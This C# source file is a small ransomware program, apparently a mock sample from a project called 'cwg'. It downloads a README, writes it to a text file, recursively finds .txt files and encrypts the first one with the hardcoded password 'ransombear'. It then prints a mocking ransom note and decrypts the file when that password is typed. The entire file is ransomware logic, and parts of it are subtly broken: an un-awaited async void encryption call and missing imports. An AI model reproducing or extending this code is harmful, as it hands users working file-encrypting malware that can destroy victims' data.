using System.Text;
using System.Security.Cryptography;
using System.Net;
using System.IO;

namespace cwg.sourceDotnet
{
    static class Program
    {
        const string password = "ransombear";

        static void Main()
        {

            //Encrypt the files
            EncryptTheFiles();

            //display the randsom note screen
            Console.WriteLine("You are panicking.You should be.\nYou should have never ran this program because all your important files were encrypted.\nBut here we are, you just messed up big time...again.\nBut there is a possiblity for salvation.\nYou can enter the magic word and your files will be decrypted.\nYou'll find this magic word but not until your soul has been crushed and you have lost whatever little sanity you have left.\nOr just enter ransombear below.");
            string response = Console.ReadLine();
            if (response == password)
                DecryptTheFiles();
        }

        private static void DecryptTheFiles()
        {
            EnumerationOptions enumerationOptions = new EnumerationOptions();
            enumerationOptions.IgnoreInaccessible = true;
            enumerationOptions.RecurseSubdirectories = true;

            IEnumerable<string> directoryList = Directory.GetFiles(AppContext.BaseDirectory, "*txt", enumerationOptions);
            Crypto.DecryptFile(directoryList.ElementAtOrDefault(0), password);
        }

        private static async void EncryptTheFiles()
        {
            EnumerationOptions enumerationOptions = new EnumerationOptions();
            enumerationOptions.IgnoreInaccessible = true;
            enumerationOptions.RecurseSubdirectories = true;

            HttpClient client = new HttpClient();
            HttpResponseMessage response = await client.GetAsync("https://raw.githubusercontent.com/jcapellman/cwg/master/README.md");
            response.EnsureSuccessStatusCode();
            string responseBody = await response.Content.ReadAsStringAsync();

            File.WriteAllText("FileToEncrypt.txt", responseBody);

            IEnumerable<string> directoryList = Directory.GetFiles(AppContext.BaseDirectory, "*txt", enumerationOptions);
            
            Crypto.EncryptFile(directoryList.ElementAtOrDefault(0), password);
        }
    }
}
